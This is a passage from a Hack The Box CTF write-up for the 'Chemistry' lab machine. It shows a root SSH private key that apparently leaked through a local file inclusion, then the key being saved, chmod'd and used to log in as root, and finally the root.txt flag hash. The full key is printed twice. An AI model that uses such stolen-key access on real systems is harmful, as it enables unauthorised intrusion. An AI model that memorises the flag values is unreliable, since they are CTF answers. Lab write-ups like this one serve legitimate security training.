Etag: "17d9a4c79c30680c-a2a"
Last-Modified: Mon, 17 Jun 2024 00:58:31 GMT
Content-Length: 2602
Accept-Ranges: bytes
Date: Sun, 20 Oct 2024 09:57:35 GMT
Server: Python/3.9 aiohttp/3.9.1

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

![](images/2024-10-20_11-57_8080_site_monitoring_lfi_root_id_rsa.png)

As last step we saved the key, set the required permissions and logged in as `root` to grab the `roo.txt`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Chemistry/files]
└─$ cat root_id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Chemistry/files]
└─$ chmod 600 root_id_rsa
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Chemistry/files]
└─$ ssh -i root_id_rsa root@10.129.160.79
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun 20 Oct 2024 09:59:24 AM UTC

  System load:           0.01
  Usage of /:            72.8% of 5.08GB
  Memory usage:          23%
  Swap usage:            0%
  Processes:             235
  Users logged in:       1
  IPv4 address for eth0: 10.129.160.79
  IPv6 address for eth0: dead:beef::250:56ff:fe94:c8e1

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

9 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Oct 11 14:06:59 2024
root@chemistry:~# 

```

## root.txt

```c
root@chemistry:~# cat root.txt 
1016bf7ea774f9d5cb45cdae8a2a059a
```
